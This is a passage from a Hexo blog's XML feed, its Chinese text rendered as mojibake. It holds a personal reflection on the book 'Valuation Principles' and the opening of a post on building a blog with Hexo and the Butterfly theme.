class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> java </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>ä¼°å€¼åŸç†å¬åæ„Ÿ</title>
      <link href="/2023/10/12/%E4%BC%B0%E5%80%BC%E5%8E%9F%E7%90%86/"/>
      <url>/2023/10/12/%E4%BC%B0%E5%80%BC%E5%8E%9F%E7%90%86/</url>
      
        <content type="html"><![CDATA[<h1 id="ä¼°å€¼åŸç†å¬åæ„Ÿ"><a href="#ä¼°å€¼åŸç†å¬åæ„Ÿ" class="headerlink" title="ä¼°å€¼åŸç†å¬åæ„Ÿ"></a>ä¼°å€¼åŸç†å¬åæ„Ÿ</h1><hr><p>å†™æœ¬æ–‡çš„åŸå› æ˜¯åœ¨å°å®‡å®™ä¸Šå¬äº†é¢åŸºçš„ä¸€æœŸåšå®¢:<a href="https://www.xiaoyuzhoufm.com/episode/6523d01550cf691d244cf8d5?s=eyJ1IjoiNjQ2MzY1NThlZGNlNjcxMDRhZjVlY2Q5In0%3D" style="color: #177cb0; text-decoration: underline;text-decoration-style: dotted;">ã€Šä¼°å€¼åŸç†ã€‹:ä»æ²¡æƒ³è¿‡è¿˜å¯ä»¥è¿™ä¹ˆçœ‹ä¼°å€¼!</a>,ç»™äº†æˆ‘ä¸€äº›æ€è€ƒå’Œå¯å‘</p><h2 id="ä¼°å€¼"><a href="#ä¼°å€¼" class="headerlink" title="ä¼°å€¼"></a>ä¼°å€¼</h2><p>ä¼°å€¼æ˜¯æŒ‡è¯„å®šä¸€é¡¹èµ„äº§å½“æ—¶ä»·å€¼çš„è¿‡ç¨‹,è¿™æ˜¯ç™¾åº¦ç™¾ç§‘çš„å®šä¹‰</p><p>é‚£ä»·å€¼åˆæ˜¯ä»€ä¹ˆå‘¢?ä»·å€¼,æ³›æŒ‡å®¢ä½“å¯¹äºä¸»ä½“è¡¨ç°å‡ºæ¥çš„ç§¯ææ„ä¹‰å’Œæœ‰ç”¨æ€§.è¿™ä¹Ÿæ˜¯ç™¾åº¦ç™¾ç§‘çš„å®šä¹‰.</p><p>æ‰€ä»¥è¯´ä»·å€¼è¿™ä¸ªä¸œè¥¿æ˜¯å› äººè€Œå¼‚çš„,æ¯ä¸ªäººéƒ½æœ‰ä¸åŒçš„è§‚å¿µ,ä»–ä»¬å¯¹åŒä¸€æ ·èµ„äº§(ç‰©å“)çš„çœ‹æ³•æ˜¯ä¸åŒçš„,å› è€ŒåŒä¸€æ ·èµ„äº§å¯¹ä¸åŒäººæ¥è¯´å…·æœ‰ä¸åŒçš„ä»·å€¼.</p><p>æ¯”å¦‚è¯´,é’»çŸ³,å¯¹äºæˆ‘è¿™ç§ç†å·¥ç§‘ç›´ç”·æ¥è¯´å°±æ˜¯å¥½çœ‹ä¸€ç‚¹çš„ç¢³,æ²¡æœ‰ç‰¹æ®Šçš„ä»·å€¼,ä½†åœ¨å¦ä¸€äº›äººçœ¼é‡Œå°±æ˜¯çˆ±æƒ…çš„è±¡å¾.</p><p>å¯è™½ç„¶å¯¹ä¸åŒçš„äººæ¥è¯´èµ„äº§çš„ä»·å€¼æ˜¯æœ‰å¾ˆå¤§å·®å¼‚çš„,ä½†æ˜¯è¿™äº›èµ„äº§åœ¨å¸‚åœºä¸ŠåŸºæœ¬æœ‰ç€ç›¸å¯¹ç¨³å®šçš„ä»·æ ¼,è¿™å°±å¯ä»¥å¼•å‡ºè¿™æœ¬ä¹¦çš„ä¸€ä¸ªè§‚ç‚¹:<strong>ä»·å€¼æ¸¸æˆè®º</strong></p><h2 id="ä»·å€¼æ¸¸æˆè®º"><a href="#ä»·å€¼æ¸¸æˆè®º" class="headerlink" title="ä»·å€¼æ¸¸æˆè®º"></a>ä»·å€¼æ¸¸æˆè®º</h2><p>ä»·æ ¼æ˜¯ä¼°å€¼çš„æœ€ç›´è§‚ä½“ç°,æ‰€ä»¥äººä»¬æ€»è§‰å¾—,ä¼°å€¼æ¥æºäºäº¤æ˜“,è€Œäº¤æ˜“è„±èƒäºå¸‚åœº.ä½†è¿™å…¶å®æ˜¯ä¸€ç§è¯¯è§£,å¸‚åœºåªæ˜¯æä¾›äº†äº¤æ˜“ä¾¿åˆ©å’Œæ¸…ç®—æœåŠ¡è€Œå·²,ä¼°å€¼æ¥è‡ªç¤¾ä¼š</p><p>å¦‚æœä¸€ä¸ªç¤¾ä¼šè¦æå€¡æŸç§ä»·å€¼è§‚ï¼Œå°±ä¸€å®šä¼šç”¨ç›¸åº”çš„èµ„äº§å»ä½“ç°è¿™ç§ä»·å€¼è§‚.æˆ–è€…è¯´,å½“ä¸€ä¸ªç¤¾ä¼šå†³å®šç”¨ä¸€åœºæ¸¸æˆæ¥è§£å†³æŸä¸ªç¤¾ä¼šé—®é¢˜æ—¶,ä»–ä»¬ä¼šæ ¹æ®æƒ…å†µé€‰æ‹©æ˜¯æ£’çƒèµ›è¿˜æ˜¯è¶³çƒèµ›è¿˜æ˜¯ç¯®çƒèµ›</p><p>è¿™åœºæ¸¸æˆéœ€è¦ä¸€äº›ç‰¹å®šçš„ç¾å¾·ã€ç§©åºã€è§„èŒƒã€å…±è¯†,è¿™äº›è¢«é¼“åŠ±çš„ä¸œè¥¿éƒ½éœ€è¦ä¸€ä¸ªå¾ˆå…·ä½“çš„è½½ä½“.è¿™ä¸ªè½½ä½“å°±æ˜¯é‚£é¢—çƒ,é‚£é¢—çƒå°±æ˜¯è¢«å…¨ç¤¾ä¼šè¿½æ§çš„èµ„äº§,å®ƒä¸€å®šäº«å—é«˜ä¼°å€¼</p><p>æˆ¿äº§ã€è‚¡ç¥¨ã€é»„é‡‘ã€ç¢³æ’æ”¾é¢ï¼Œä»»ä½•ä¸€é¡¹èµ„äº§éƒ½ç¬¦åˆä¸”æœä»äºå„è‡ªç¤¾ä¼šçš„ä¼°å€¼ä½“ç³»ã€‚è¿™äº›ä¼°å€¼ä½“ç³»æ ¹æ¤äºå…¨ç¤¾ä¼šçš„æ€æƒ³è§‚å¿µå’Œé£ä¿—ä¹ æƒ¯ä¹‹ä¸­ã€‚</p><p>ä¸ºä»€ä¹ˆæœ‰çš„å›½å®¶è‚¡ç¥¨æ¶¨å¾—å‰å®³?</p><p>ä¸ºä»€ä¹ˆåŒä¸€æ—¶æœŸæœ‰çš„å›½å®¶æˆ¿äº§æ¶¨å¾—å‰å®³è€Œè‚¡ç¥¨å´ä¸€è·Œå†è·Œ?</p><p>ä¸ºä»€ä¹ˆå¤®è¡Œé‡Šæ”¾äº†æµåŠ¨æ€§ï¼Œç»“æœå´å¯¼è‡´æˆ¿ä»·ä¸Šæ¶¨ï¼Œè‚¡ä»·ä¸‹è·Œ?</p><p>è¿™æ˜¯å› ä¸ºäººä»¬ç”¨èµ„äº§åœ¨ç©ä¸åŒçš„æ¸¸æˆï¼Œä½¿ç”¨äº†ä¸åŒçš„è§„åˆ™å¯¼è‡´çš„.æ‰€ä»¥ï¼Œåœ¨ä»·æ ¼æ¶¨è·Œä¹‹å¤–ï¼Œè¦è§‚å¯Ÿå¤§å®¶åœ¨ç©ä»€ä¹ˆæ¸¸æˆï¼Ÿè§‚å¯Ÿå¤§å®¶æ³¨é‡ä»€ä¹ˆï¼Ÿè¦è§£å†³ä»€ä¹ˆé—®é¢˜ï¼Ÿ</p><p>ä¸¾å‡ ä¸ªä¾‹å­:</p><p><strong>1.</strong><br>åœ¨é‡‘æœ¬ä½æ—¶ä»£ï¼Œè¿™ä¸ªç¤¾ä¼šä¼šé¼“åŠ±å‹¤ä¿­å’Œå­é¡ºã€‚</p><p>å› ä¸ºè´§å¸ä»¥é»„é‡‘ä¸ºé”šï¼Œå¾ˆéš¾è¶…å‘ï¼Œå‹¤ä¿­èŠ‚çº¦æ˜¯æœ‰æ•ˆçš„ï¼Œæœ¬è´¨æ˜¯åœ¨å‚¨å­˜æœ‰æ•ˆè´­ä¹°åŠ›ã€‚</p><p>ä½†ä¸€ä¸ªäººåœ¨è·µè¡Œå‹¤ä¿­èŠ‚çº¦çš„ã€Œç¾å¾·ã€ï¼Œå¾€å¾€æ˜¯ä¸ºäº†è‡ªå·±å’Œå­©å­ç§¯æ”’æ›´å¤šçš„ç”Ÿæ´»èµ„æ–™</p><p>é‡‘æœ¬ä½æ—¶ä»£ä¹Ÿä¸€å®šé¼“åŠ±å‚¨è“„è¿™ä¸ªç¾å¾·ï¼Œå‚¨è“„æ„å‘³ç€ä¸æç°ï¼Œä¸å»å…‘æ¢å®ç‰©é»„é‡‘ã€‚å› ä¸ºé‡‘æœ¬ä½æ—¶ä»£çš„é»„é‡‘å‚¨å¤‡æ ¹æœ¬ä¸è¶³ä»¥åº”å¯¹å¤§é‡æå–å®ç‰©é»„é‡‘ã€‚é‡‘æœ¬ä½å°±æ˜¯ä¸€ä¸ªæ‰¿è¯ºè€Œå·²ã€‚</p><p>è‹±æ ¼å…°é“¶è¡Œé¼“åŠ±ä½ æŠŠçº¸å¸å­˜å…¥é“¶è¡Œï¼Œå¹¶æ”¯ä»˜åˆ©æ¯ï¼Œå®ƒå¯¹æ—¥å¸¸çš„çº¸å¸å…‘æ¢é»„é‡‘ä¿è¯ç…§ä»˜ä¸è®®ï¼Œå®ƒç»´æŠ¤ç‰©ä»·ç¨³å®šï¼Œæå€¡çœåƒä¿­ç”¨ï¼Œé‡å…¥ä¸ºå‡ºï¼Œä»–ç»™ä½ è¶³å¤Ÿå¤šçš„ç†ç”±ä¸å»æå–é»„é‡‘ï¼Œå®‰å¿ƒæŒæœ‰çº¸å¸ã€‚</p><p>å–œæ¬¢å‚¨è“„ï¼Œæ„å‘³ç€æ‹¥æœ‰æ›´å¤šé»„é‡‘ï¼Œä»è€Œæ‹¥æœ‰æ›´é«˜çš„ç¤¾ä¼šåœ°ä½ã€‚</p><p>åŒæ—¶ï¼Œå½“å…¨ç¤¾ä¼šéƒ½åœ¨ç©è¿™ä¸ªæ¸¸æˆæ—¶ï¼Œæ²¡ä»€ä¹ˆå‡ºè·¯çš„è‹±å›½äººä¹Ÿçƒ­è¡·å»æµ·å¤–æ‹“å±•æ®–æ°‘åœ°è·å¾—æ›´å¤šçš„é»„é‡‘ï¼Œä»¥ä¾¿å›å›½åæé«˜è‡ªå·±çš„ç¤¾ä¼šåœ°ä½ã€‚</p><p><strong>2.</strong><br>åœ¨ä¿¡ç”¨æœ¬ä½æ—¶ä»£ï¼ŒæŠŠä¸€å †é’ç¥¨åƒé»„é‡‘ä¸€æ ·ç•™ç»™åä»£å·²ç»å€¼ä¸äº†å‡ ä¸ªé’±äº†ï¼Œç¤¾ä¼šéœ€è¦åˆ«çš„ä¼ æ‰¿èµ„äº§ã€‚</p><p><strong><em>å¦‚æœç¤¾ä¼šé€‰æ‹©äº†æˆ¿äº§æ¸¸æˆï¼Œå®ƒå°±åœ¨é¼“åŠ±ã€Œå‹‡æ•¢ã€å’Œã€Œåšå¿ã€ã€‚ä¸€ä¸ªäººå¿…é¡»å‹‡æ•¢åœ°èƒŒä¸Šé«˜é¢æˆ¿è´·ï¼ŒåŒæ—¶åšå¿åœ°åŠªåŠ›å·¥ä½œ30å¹´æ¥å¿è¿˜æœˆä¾›ã€‚</em></strong></p><p>å¯¹ç”·äººæ¥è¯´ï¼Œæˆ¿äº§å°±åƒå¥³äººçš„é’»çŸ³ï¼Œé‚£æ˜¯é˜¶å±‚ç­‰çº§çš„æ ‡è¯†ï¼Œæœ‰äº†å®ƒï¼Œæ„å‘³ç€æ‹©å¶ä¼˜å…ˆæƒã€‚</p><p>æˆ¿ä»·è¶Šè´µï¼Œå°±ä¼šæœ‰æ›´å¤šçš„å¹´è½»äººå¯¹å…¶è¶‹ä¹‹è‹¥éª›ï¼ŒåŠªåŠ›å¥‹æ–—ã€‚è€Œé»„é‡‘çš„ä»·æ ¼æ¶¨å¹…è¿œè¿œè½åäºæˆ¿åœ°äº§ä»·æ ¼çš„æ¶¨å¹…ã€‚è¿™è¯´æ˜æˆ‘ä»¬ç°åœ¨å’Œé‡‘æœ¬ä½æ—¶ä»£ç©çš„å°±æ˜¯ä¸¤ç§ä¸åŒçš„æ¸¸æˆã€‚</p><p><strong>3.</strong><br>å¦‚æœç¤¾ä¼šé€‰æ‹©äº†è‚¡ç¥¨æ¸¸æˆï¼Œå®ƒå°±åœ¨é¼“åŠ±ã€Œç‹¬ç«‹ã€å’Œã€Œæ•ˆç‡ã€ä¸¤ç§ç¾å¾·ã€‚</p><p>å…¬å¸éœ€è¦æƒ³åŠæ³•ï¼Œå°¤å…¶æ˜¯ä¾é ç§‘æŠ€å’Œåˆ›æ–°æ¥æé«˜ç¤¾ä¼šçš„æ•ˆç‡ï¼Œä»¥ä¾¿æ‹¿åˆ°æ›´é«˜çš„ä¼°å€¼ã€‚</p><p>æœ¬ä¹¦ä½œè€…å‘¨æ´›åä¹Ÿæ˜¯ä¸€ä½è‚¡æ°‘ï¼Œä»–ä»¥å‰å¹¶æ²¡æœ‰æ„è¯†åˆ°è‚¡ç¥¨æ˜¯æå‡æ•ˆç‡æ¸¸æˆçš„çƒï¼Œæˆ¿äº§æ˜¯åœ°ä½æ™‹å‡æ¸¸æˆçš„çƒã€‚</p><p>ä»–æŠŠè‚¡ç¥¨å½“æˆäº†è®©è‡ªå·±åœ°ä½æ™‹å‡çš„çƒï¼Œç»“æœä»–ç‚’è‚¡æ€»æ˜¯äºé’±ã€‚</p><p><strong>ä»æ¸¸æˆçš„è§’åº¦çœ‹å¾…ä¼°å€¼ï¼Œå°±ä¼šå‘ç°è¿™åœºæ¸¸æˆæŠŠæ•£æˆ·å¥—åœ¨é«˜ä½è¿˜æ˜¯æŒºåˆç†çš„ã€‚</strong></p><p><strong>åªæœ‰æŠŠå¤§é‡çš„æ•£æˆ·æŠ•èµ„äººå¥—åœ¨é«˜ä½ï¼Œæ‰èƒ½ä½¿å¾—ä»–ä»¬æ”¾å¼ƒè´¢å¯Œè‡ªç”±çš„å¹»æƒ³ï¼Œæ‰èƒ½ä½¿å¾—ä»–ä»¬åŠªåŠ›å·¥ä½œã€‚</strong></p><p><strong>è¿™ä¸ªç¤¾ä¼šæ²¡åŠæ³•åŒæ—¶å¿«é€Ÿåœ°è®©äººå¤§è§„æ¨¡åœ°å‘è´¢ã€‚</strong></p><hr><p>å½“æŸé¡¹èµ„äº§æˆä¸ºå›½æ°‘æ€§çš„å…³é”®èµ„äº§æ—¶ï¼Œ<strong>å®ƒä¸€å®šæ˜¯ã€Œä½æ¢æ‰‹ç‡ã€çš„</strong>ã€‚æˆ–è€…è¯´ï¼Œè¿™ç±»èµ„äº§çš„æ¢æ‰‹ç‡ä¸€å®šæ˜¯è¢«åˆ»æ„å‹ä½çš„ã€‚</p><p>æ¯”å¦‚æˆ‘ä»¬åˆšæåˆ°çš„ï¼Œé‡‘æœ¬ä½æ—¶ä»£é¼“åŠ±å‚¨è“„ï¼Œä»è€Œé™ä½äº†é»„é‡‘å…‘æ¢ã€‚</p><p>å†æ¯”å¦‚æˆ‘ä»¬ä¸€çº¿æ¥¼å¸‚ä¹‹å‰çš„è®¤æˆ¿åˆè®¤è´·ï¼Œäº¬æ²ªå­˜é‡æˆ¿æºå¤§æ¦‚800ä¸‡å¥—ï¼Œä½†æ¯å¹´çš„æˆäº¤é‡åªæœ‰äºŒä¸‰åä¸‡å¥—ï¼Œå¹´æ¢æ‰‹ç‡ä¸åˆ°5%ã€‚</p><p>åªè¦å…±è¯†è¿˜åœ¨ã€ä¿¡å¿ƒè¿˜åœ¨ï¼Œä½ çŸ¥é“å–çš„æ—¶å€™å¸‚åœºçš„æ‰¿æ¥åŠ›æ¥å¾—ä½ï¼Œä¹Ÿæ„¿æ„æ¥ï¼Œé‚£å°±é•¿æœŸæŒæœ‰ã€‚</p><p>é‡‘æœ¬ä½æ—¶ä»£ï¼Œå¤§å®¶æ„¿æ„æŒæœ‰çº¸å¸è€Œä¸æ˜¯é»„é‡‘ï¼Œå› ä¸ºä»–ä»¬çŸ¥é“åªè¦å»è‹±æ ¼å…°é“¶è¡Œï¼Œçº¸å¸å°±å¯ä»¥æ¢å‡ºé»„é‡‘ã€‚</p><p>ç±»ä¼¼çš„ï¼Œå¤§å®¶ç›¸ä¿¡äº¬æ²ªæ°¸è¿œæ¶¨ï¼Œå°±æ„¿æ„æŒæœ‰æˆ¿å­ï¼Œè€Œä¸æ˜¯æ€¥äºæŠŠå®ƒæŠ›æ‰ã€‚</p><p>å¤§å®¶ç›¸ä¿¡ç¾è‚¡é•¿ç‰›ï¼Œå°±æ„¿æ„æŒæœ‰è‚¡ç¥¨ï¼Œè€Œä¸æ˜¯åƒ2020å¹´3æœˆé‚£æ ·åœ¨å¸‚åœºä¸Šç–¯ç‹‚æŠ›å”®ã€‚</p><p><strong><em>ç¤¾ä¼šåœ¨ç©ä¸åŒçš„æ¸¸æˆ,å°±ä¼šå¯¼è‡´ä¸åŒçš„èµ„äº§æˆä¸ºå›½æ°‘æ€§èµ„äº§,æ¯”å¦‚ä¸­å›½çš„æˆ¿äº§,ç¾å›½çš„è‚¡ç¥¨,æ¬§æ´²çš„å€ºåˆ¸,è¿™ä¸ä»…ä»…æ˜¯ç”±ç¤¾ä¼šçš„å‘å±•é˜¶æ®µå†³å®šçš„,è¿˜å¤¹æ‚äº†åˆ¶å®šè§„åˆ™çš„é˜¶çº§çš„å¼ºçƒˆæ„å¿—(ä»–ä»¬æ€»è¦ä¿éšœè‡ªå·±çš„åˆ©ç›Š)</em></strong></p><p>åªæœ‰å°‘æ•°çš„äººèƒ½getåˆ°æ¸¸æˆçš„è§„åˆ™,ä»è€Œè·å–é«˜é¢æ”¶ç›Š,å¹¶ä¸”è¦æ—¶åˆ»è­¦é†’,å…³æ³¨æ¸¸æˆè§„åˆ™,å¦åˆ™ä¹‹å‰è·å¾—çš„é«˜é¢æ”¶ç›Šå¾ˆå¿«å°±ä¼šæ¶ˆå¤±</p><p>è¯´ä¸ªæœ€è¿‘çœ‹åˆ°çš„ä¾‹å­,ç¾å›½ç–¯ç‹‚å°é’å¤§æ”¾æ°´,ç¾å›½æ”¿åºœçš„æ¬ å€ºä¹Ÿè¶Šæ¥è¶Šå¤š,å¯æ˜¯ä»–ä»¬çš„è´Ÿå€ºç‡å´ä¸‹é™äº†,åŸå› æ˜¯åœ¨è¿™åœºå¤§æ”¾æ°´ä¸­ä»–ä»¬ä½¿èµ„äº§çš„ä¸Šæ¶¨å¹…åº¦è¶…è¿‡äº†è´Ÿå€ºçš„ä¸Šæ¶¨å¹…åº¦.æ­£åº”äº†æ‹œç™»æ›¾è¯´çš„ä¸€å¥è¯,<strong>é€šèƒ€ä¸æ˜¯ä»€ä¹ˆå¯æ€•çš„ä¸œè¥¿,é€šèƒ€æ˜¯ä¸€ç§æ­¦å™¨.</strong></p><p>è¿™å°±æ˜¯ç¾å›½çš„æ¸¸æˆ,æˆ‘ä»¬åœ¨ä»–äººåˆ¶å®šçš„æ¸¸æˆè§„åˆ™é‡Œ,æ°¸è¿œä¸å¯èƒ½æˆä¸ºæœ€ç»ˆèµ¢å®¶,æˆ–è€…è¯´æˆ‘ä»¬ä¸å¯èƒ½ä¸€ç›´èµ¢ä¸‹å».</p><h2 id="ä¼°å€¼è´£ä»»è®º"><a href="#ä¼°å€¼è´£ä»»è®º" class="headerlink" title="ä¼°å€¼è´£ä»»è®º"></a>ä¼°å€¼è´£ä»»è®º</h2><p><strong>ç¤¾ä¼šæœ‰æ˜¾ç„¶çš„åˆ†æˆå€¾å‘ã€‚è€Œä¸”å®ƒä¸ä»…åˆ†å±‚ï¼Œè¿˜ä¼šå‚ç›´æµåŠ¨ã€‚</strong></p><p>ä¸­äº§å’Œåº•å±‚äººæ°‘ç›¸äº’æµåŠ¨,åªæœ‰æœ€é¡¶å±‚ç›¸å¯¹ç¨³å®š.è¿™å…¶å®å°±æ˜¯æ¸¸æˆè§„åˆ™çš„åˆ¶å®šè€…å¸Œæœ›çœ‹åˆ°çš„,ä»–ä»¬æ°¸è¿œå¤„äºæœ€é¡¶å±‚,é€šè¿‡æ”¹å˜è§„åˆ™ä½¿å¾—ç¤¾ä¼šæ›´åŠ é«˜æ•ˆ,ç¤¾ä¼šçš„æ•´ä½“ç´ è´¨æé«˜,è·å¾—æ›´å¤šçš„åˆ©ç›Š,å¾—åˆ°æ›´å¥½çš„æœåŠ¡.</p><p>ç»æµå­¦æ•™ç§‘ä¹¦é‡Œæœ‰ä¸¤ç§ã€Œå’Œå¹³æ–¹å¼ã€æ¥å®ç°å‚ç›´æµåŠ¨â€”â€”</p><p>ä¸€æ˜¯ä¸ªä½“æé«˜æ•ˆç‡ï¼Œå‹¤å¥‹åŠªåŠ›çš„äººä¼šæé«˜è‡ªå·±çš„ç¤¾ä¼šåœ°ä½ã€‚</p><p>äºŒæ˜¯å…¨é¢çš„ç»æµå±æœºï¼Œä¸»è¦æ˜¯æ¯å½“ä¸­å±‚å’Œä¸Šå±‚è¿‡äºæ‹¥æŒ¤æ—¶ï¼Œé€šè¿‡å±æœºå‡ºæ¸…æ‰ä¸€æ‰¹äººï¼Œç»™åæ¥è€…è…¾å‡ºæ¯”èµ›åœºåœ°ã€‚</p><p>æœ‰è¶£çš„æ˜¯ï¼Œæ¯æ¬¡åˆ‡æ¢æ¸¸æˆåï¼Œç¤¾ä¼šçš„ä¸»æµä»·å€¼è§‚å’Œé£å°šä¹Ÿä¼šéšä¹‹æ”¹å˜ã€‚äººä»¬ä¼šè°´è´£ä¸Šä¸€åœºæ¸¸æˆä¸­çš„èƒœè€…ï¼Œä»ä»–ä»¬èº«ä¸Šæ€»ç»“å‡ºä¸€å¤§å †ç¼ºç‚¹å’Œæ¯›ç—…ï¼Œå¹¶å°†å…¶è§†ä¸ºä»–ä»¬è´¢å¯Œæ¶ˆäº¡çš„åŸå› ã€‚</p><p>å…¶å®å°±æ˜¯åŸæ¥çš„æ¸¸æˆå¯èƒ½å› ä¸ºç¤¾ä¼šå„é˜¶å±‚å›ºåŒ–è€Œæ— æ³•åˆºæ¿€å¤§å®¶åŠªåŠ›å¥‹æ–—ï¼Œç©ä¸ä¸‹å»äº†(å°‘æ•°äººçš„åˆ©ç›Šæ— æ³•å¾—åˆ°æ›´å¥½çš„ä¿éšœäº†)</p><p>ä¸æ­¤åŒæ—¶ï¼Œæ¥ä¸‹æ¥ç¤¾ä¼šè¿˜ä¼šå´‡å°šä¸€ç§æ–°çš„é£å°šï¼Œç”¨æ¥è§£é‡Šä¸ºä»€ä¹ˆæœ‰äº›äººåœ¨æ–°ä¸€è½®ç»æµç¹è£ä¸­èƒœå‡ºã€‚</p><p><strong>å½’æ ¹åˆ°åº•ï¼Œæ˜¯ç¤¾ä¼šæ¢äº†ä¸ªæ–°æ¸¸æˆã€‚</strong></p><p>æ‰€ä»¥ï¼Œæ¯æ¬¡é‡‘èå±æœºå‘ç”Ÿä¹‹å‰ï¼Œç¤¾ä¼šæ€»æ˜¯ä¸€ç‰‡ç¹è£ï¼Œäººä»¬å·²ç»ä¹ æƒ¯äºç›¸ä¿¡è‡ªå·±çš„æ‰èƒ½ã€åŠªåŠ›å’Œçœ¼å…‰ã€‚</p><p>æ¯æ¬¡å±æœºä¹‹å‰ï¼Œç¤¾ä¼šä¸­ä¸Šå±‚éƒ½å·²ç»äººæ»¡ä¸ºæ‚£ã€‚</p><p>ç±»ä¼¼çš„ï¼Œç‰›å¸‚æœ«æœŸæœ‰ä¸ªé‡è¦ç‰¹å¾ï¼Œå°±æ˜¯å¤§å®¶éƒ½åœ¨è®¨è®ºè´¢å¯Œè‡ªç”±å’Œæå‰é€€ä¼‘ã€‚<strong>å‘µå‘µï¼Œæ²¡é—¨ï¼ç¤¾ä¼šä¸ä¼šç­”åº”çš„ï¼Œå®ƒä¸ä¼šè®©é‚£ä¹ˆå¤šäººéƒ½å®ç°è´¢å¯Œè‡ªç”±ï¼Œè¿›å…¥ä¸Šæµç¤¾ä¼šï¼Œæ¸¸å±±ç©æ°´ï¼Œæ¸¸æ‰‹å¥½é—²ï¼Œæœ€åå®‰äº«æ™šå¹´ã€‚</strong></p><p>å¦‚æœçœŸçš„è¿™æ ·ï¼Œé‚£å°†æ˜¯ä¸€åœºç³»ç»Ÿçš„ç¾éš¾ã€‚</p><h2 id="ç»“æŸçš„è¯"><a href="#ç»“æŸçš„è¯" class="headerlink" title="ç»“æŸçš„è¯"></a>ç»“æŸçš„è¯</h2><p>åœ¨æœ¬ç¯‡åšå®¢ä¸­,æˆ‘åªä»‹ç»äº†ã€Šä¼°å€¼åŸç†ã€‹è¿™æœ¬ä¹¦ä¸­çš„ä¸€éƒ¨åˆ†å†…å®¹,æ˜¯æˆ‘è®¤å¯çš„ä¸»è¦éƒ¨åˆ†,å½“ç„¶ä¹Ÿå¤¹æ‚äº†ä¸€äº›ä¸ªäººçš„çœ‹æ³•,å¸Œæœ›å¤§å®¶å¤šå¤šåŒ…æ¶µä¸€ä¸ªå¹´è½»äººä¸æˆç†Ÿçš„è§‚ç‚¹.æƒ³è¦äº†è§£æ›´å¤š,å¯ä»¥å»å°å®‡å®™å¬è¿™ç¯‡åšå®¢,ä¹Ÿå¯ä»¥è‡ªå·±ä¹°æ¥è¿™æœ¬ä¹¦é˜…è¯»,æœ€åæ„Ÿè°¢æ‚¨çš„é˜…è¯».</p>]]></content>
      
      
      <categories>
          
          <category> æ‚è°ˆ </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>ä¸ªäººåšå®¢çš„æ­å»º(å…¨æµç¨‹è¦†ç›–)</title>
      <link href="/2023/09/26/2023-9-26-%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2%E7%9A%84%E6%90%AD%E5%BB%BA/"/>
      <url>/2023/09/26/2023-9-26-%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2%E7%9A%84%E6%90%AD%E5%BB%BA/</url>
      
        <content type="html"><![CDATA[<h1 id="ä¸ªäººåšå®¢çš„æ­å»ºæ•™ç¨‹æ¨è-è¸©å‘è®°å½•"><a href="#ä¸ªäººåšå®¢çš„æ­å»ºæ•™ç¨‹æ¨è-è¸©å‘è®°å½•" class="headerlink" title="ä¸ªäººåšå®¢çš„æ­å»ºæ•™ç¨‹æ¨è+è¸©å‘è®°å½•"></a>ä¸ªäººåšå®¢çš„æ­å»ºæ•™ç¨‹æ¨è+è¸©å‘è®°å½•</h1><hr><h2 id="æœ¬äººåšå®¢çš„è¯´æ˜"><a href="#æœ¬äººåšå®¢çš„è¯´æ˜" class="headerlink" title="æœ¬äººåšå®¢çš„è¯´æ˜"></a>æœ¬äººåšå®¢çš„è¯´æ˜</h2><p>è¶ç€å›½åº†å‡æœŸ,èŠ±äº†å¤§æ¦‚ä¸¤å¤©æ—¶é—´å°†è¿™ä¸ªåšå®¢æ­äº†èµ·æ¥,ä¸»è¦æ˜¯èµ°äº†ä¸€äº›å¼¯è·¯(å“­),å…¶å®ä¸»è¦æ˜¯ä¸Šåˆéƒ½åœ¨ç¡æ‡’è§‰(é›¾)</p><p>é‡‡ç”¨çš„æ˜¯<a href="https://hexo.io/zh-cn/index.html%" style="color: #177cb0; text-decoration: underline;text-decoration-style: dotted;">hexoæ¡†æ¶</a></p><p>ä¸»é¢˜æ˜¯<a href="https://butterfly.js.org/" style="color: #177cb0; text-decoration: underline;text-decoration-style: dotted;">butterfly</a>,åŠ ä¸Šäº†ä¸ªäººçš„ä¸€äº›é­”æ”¹,ç”±äºæœ¬äººå–œæ¬¢ç®€æ´çš„é£æ ¼,æ‰€ä»¥é­”æ”¹çš„å†…å®¹å¹¶ä¸ç®—å¤ªå¤š</p><p>éƒ¨ç½²äº†ä¸¤ä¸ªè¿œç¨‹ä»“åº“,ä¸€ä¸ªæ˜¯æˆ‘çš„githubä»“åº“,å¦ä¸€ä¸ªæ˜¯æˆ‘åœ¨é˜¿é‡Œäº‘æœåŠ¡å™¨ä¸Šçš„ä»“åº“</p><hr><h2 id="æ•™ç¨‹æ¨è"><a href="#æ•™ç¨‹æ¨è" class="headerlink" title="æ•™ç¨‹æ¨è"></a>æ•™ç¨‹æ¨è</h2><p>è‡ªå­¦èƒ½åŠ›æ¯”è¾ƒå¼ºçš„åŒå­¦å¯ä»¥å»çœ‹å®˜æ–¹æ–‡æ¡£,ä¸Šä¸€è¶´å·²æœ‰é“¾æ¥</p><p>æ¨èä¸€äº›ä¿å§†çº§æ•™ç¨‹: </p><ol><li><a href="https://www.fomal.cc/" style="color: #177cb0; text-decoration: underline;text-decoration-style: dotted;">Fomalhautçš„åšå®¢</a>,æ—¢æœ‰åŸºç¡€æ•™ç¨‹,ä¹ŸåŒ…å«äº†é­”æ”¹æ•™ç¨‹,è¿˜æœ‰<a href="https://space.bilibili.com/220757832" style="color: #177cb0; text-decoration: underline;text-decoration-style: dotted;">Fomalhautçš„bilibiliä¸»é¡µ</a></li><li><a href="https://blog.anheyu.com/" style="color: #177cb0; text-decoration: underline;text-decoration-style: dotted;">å®‰çŸ¥é±¼çš„åšå®¢</a>,å†…å®¹ååˆ†è¯¦ç»†,å®‰çŸ¥é±¼ä¸»é¢˜ä¹Ÿååˆ†å¥½çœ‹å“¦,ä½¬çš„<a href="https://space.bilibili.com/372204786" style="color: #177cb0; text-decoration: underline;text-decoration-style: dotted;">bilibiliä¸»é¡µé“¾æ¥</a></li></ol><p>å»ºè®®å°ç™½è·Ÿç€è§†é¢‘ä¸€æ­¥æ­¥æ“ä½œ,æŒæ¡äº†åŸºç¡€å°±å¯ä»¥å»é­”æ”¹è‡ªå·±æƒ³è¦çš„æ•ˆæœå•¦</p><hr><h3 id="æ¨èä¸€äº›åˆ«çš„ä¸»é¢˜"><a 